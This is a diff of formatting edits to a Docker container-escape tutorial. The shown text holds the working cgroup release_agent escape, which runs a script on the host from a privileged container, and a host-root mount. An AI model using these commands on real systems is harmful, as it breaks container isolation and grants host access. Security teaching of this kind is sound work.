@@ -14,7 +14,7 @@ description = "This post will cover some techniques to escape Docker containers 
   - [Setup a vulnerable container](#setup-a-vulnerable-container)
   - [Exploit the container](#exploit-the-container)
 - [Docker API escaping](#docker-api-escaping)
-  - [Setup the lab](#setup-the-lab)
+  - [Setting up the lab](#setting-up-the-lab)
   - [Exploit the vulnerable container](#exploit-the-vulnerable-container)
 
 
@@ -61,13 +61,15 @@ Spoiler:
 
 ```
 $ docker run -it -v /:/mount alpine
-/ # ls /mount
+# ls /mount
 bin         etc         lib32       media       root        swapfile    var
 boot        home        lib64       mnt         run         sys
 cdrom       keybase     libx32      opt         sbin        tmp
 dev         lib         lost+found  proc        srv         usr
 ```
 🙃
+
+---
 
 # Exploiting cgroups
 
@@ -96,9 +98,9 @@ It is based on the fact that when the last process in a cgroup ends, the content
 First, let's create some directories where we will mount a `cgroup` controller named RDMA[^2]:
 
 ```
-/ # mkdir /tmp/cgroup
-/ # mount -t cgroup -o rdma cgroup /tmp/cgroup/
-/ # mkdir /tmp/cgroup/x
+# mkdir /tmp/cgroup
+# mount -t cgroup -o rdma cgroup /tmp/cgroup/
+# mkdir /tmp/cgroup/x
 ```
 
 To interact with a `cgroup`, we need to mount the appropriate fs with the desired controllers.
@@ -109,13 +111,13 @@ And then we create a child cgroup name "x" which will inherit the properties of 
 Now, we must enable cgroup notifications on release for the "x" cgroup. This can be done by setting a 1 in `notify_on_release` inside the "x" cgroup:
 
 ```
-/ # echo 1 > /tmp/cgroup/x/notify_on_release
+# echo 1 > /tmp/cgroup/x/notify_on_release
 ```
 
 Then, we must get the location of the `release_agent` file on the host:
 
 ```
-/ # host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 ```
 
 We can do this because the `root` user in a container is exactly the same `root` user than on the host ! If you want to verify this, you can get the value store in `$host_path` is accessible by your `root` user on the host. In fact, the container filesystem is mounted under `/var/lib/docker` on the host.
@@ -123,27 +125,27 @@ We can do this because the `root` user in a container is exactly the same `root`
 Now, let's put the path of the script inside `release_agent`:
 
 ```
-/ # echo "$host_path/script" > /tmp/cgroup/release_agent
+# echo "$host_path/script" > /tmp/cgroup/release_agent
 ```
 
 And create the script we want to execute on the host:
 
 ```
-/ # echo '#!/bin/sh' > /script
-/ # echo "ls /home/ezekiel > $host_path/result" >> /script
+# echo '#!/bin/sh' > /script
+# echo "ls /home/ezekiel > $host_path/result" >> /script
 ```
 
 Make it executable:
 
 ```
-/ # chmod a+x /script
+# chmod a+x /script
 ```
 
 And launch a process in the cgroup that will exit instantly:
 
 ```
-/ # sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
-/ # head /result -n1
+# sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
+# head /result -n1
 Desktop
 ```
 
